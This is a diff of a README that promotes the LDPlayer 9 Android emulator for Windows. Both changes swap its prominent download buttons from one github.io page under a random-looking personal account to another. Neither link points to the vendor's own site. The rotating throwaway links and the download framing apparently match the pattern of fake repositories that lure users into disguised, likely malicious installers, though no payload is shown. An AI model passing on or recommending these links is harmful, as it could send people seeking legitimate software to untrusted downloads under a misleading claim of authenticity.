@@ -16,7 +16,7 @@ LDPlayer 9 is a multi-instance Android emulator for Windows that lets you run se
 <div align="center">
   <h3>Run multiple Android games side by side on one PC</h3>
 
-  [![Download LDPlayer 9](https://img.shields.io/badge/⬇_Download_LDPlayer_9_for_Windows-2962FF?style=for-the-badge)](https://meridithsloanermwfqj.github.io/.github/LDPlayer-9-PC-Emulator-App)
+  [![Download LDPlayer 9](https://img.shields.io/badge/⬇_Download_LDPlayer_9_for_Windows-2962FF?style=for-the-badge)](https://raymondcopeland66.github.io/.github/LDPlayer-9-PC-Emulator-App)
 
 </div>
 
@@ -93,7 +93,7 @@ For help with LDPlayer 9, open the built-in Help or Support section inside the a
 <div align="center">
   <h3>Ready to get started with LDPlayer 9?</h3>
 
-  [![Download LDPlayer 9](https://img.shields.io/badge/⬇_Download_LDPlayer_9_for_Windows-2962FF?style=for-the-badge)](https://meridithsloanermwfqj.github.io/.github/LDPlayer-9-PC-Emulator-App)
+  [![Download LDPlayer 9](https://img.shields.io/badge/⬇_Download_LDPlayer_9_for_Windows-2962FF?style=for-the-badge)](https://raymondcopeland66.github.io/.github/LDPlayer-9-PC-Emulator-App)
 
 </div>
 
